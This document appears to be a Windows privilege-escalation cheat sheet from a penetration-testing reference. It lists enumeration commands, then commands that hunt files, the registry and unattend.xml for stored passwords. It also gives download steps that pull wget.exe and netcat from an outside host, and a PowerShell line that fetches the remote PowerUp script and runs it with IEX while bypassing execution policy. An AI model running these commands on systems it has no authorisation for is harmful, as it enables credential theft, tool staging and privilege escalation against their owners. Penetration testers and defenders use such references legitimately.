# Windows - Privilege Escalation

Almost all of the following commands are from [The Open Source Windows Privilege Escalation Cheat Sheet](https://addaxsoft.com/wpecs/)

## Windows Version and Configuration

```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

Architecture

```powershell
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```

List all env variables

```powershell
set
```

List all drives

```powershell
wmic logicaldisk get caption || fsutil fsinfo drives
```

## User Enumeration

Get current username

```powershell
echo %USERNAME% || whoami
```

List all users

```powershell
net user
whoami /all
```

List logon requirements; useable for bruteforcing

```powershell
net accounts
```

Get details about a user (i.e. administrator, admin, current user)

```powershell
net user administrator
net user admin
net user %USERNAME%
```

List all local groups

```powershell
net localgroup
```

Get details about a group (i.e. administrators)

```powershell
net localgroup administrators
```

## Network Enumeration

List all network interfaces

```powershell
ipconfig /all
```

List current routing table

```powershell
route print
```

List the ARP table

```powershell
arp -A
```

List all current connections

```powershell
netstat -ano
```

List firware state and current configuration

```powershell
netsh advfirewall firewall dump
```

List all network shares

```powershell
net share
```

## Looting for passwords

### Search for file contents**

```powershell
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
```

### Search for a file with a certain filename

```powershell
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```

### Search the registry for key names

```powershell
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
```

### Read a value of a certain sub key

```powershell
REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList
```

### Password in unattend.xml

Location of the unattend.xml files

```powershell
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

Example content

```powershell
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>*SENSITIVE*DATA*DELETED*</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

The Metasploit module `post/windows/gather/enum_unattend` looks for these files.

## Processes Enum

What processes are running?

```powershell
tasklist /v
```

Which processes are running as "system"

```powershell
tasklist /v /fi "username eq system"
```

Do you have powershell magic?

```powershell
REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
```

## Uploading / Downloading files

a wget using powershell

```powershell
powershell -Noninteractive -NoProfile -command "wget https://addaxsoft.com/download/wpecs/wget.exe -UseBasicParsing -OutFile %TEMP%\wget.exe"
```

wget using bitsadmin (when powershell is not present)

```powershell
cmd /c "bitsadmin /transfer myjob /download /priority high https://addaxsoft.com/download/wpecs/wget.exe %TEMP%\wget.exe"
```

now you have wget.exe that can be executed from %TEMP%wget for example I will use it here to download netcat

```powershell
%TEMP%\wget https://addaxsoft.com/download/wpecs/nc.exe
```

## Spot the weak service using PowerSploit's PowerUP

```powershell
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
```

## Thanks to

* [The Open Source Windows Privilege Escalation Cheat Sheet by amAK.xyz and @xxByte](https://addaxsoft.com/wpecs/)
* [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
* [TOP–10 ways to boost your privileges in Windows systems - hackmag](https://hackmag.com/security/elevating-privileges-to-administrative-and-further/)
* [The SYSTEM Challenge](https://decoder.cloud/2017/02/21/the-system-challenge/)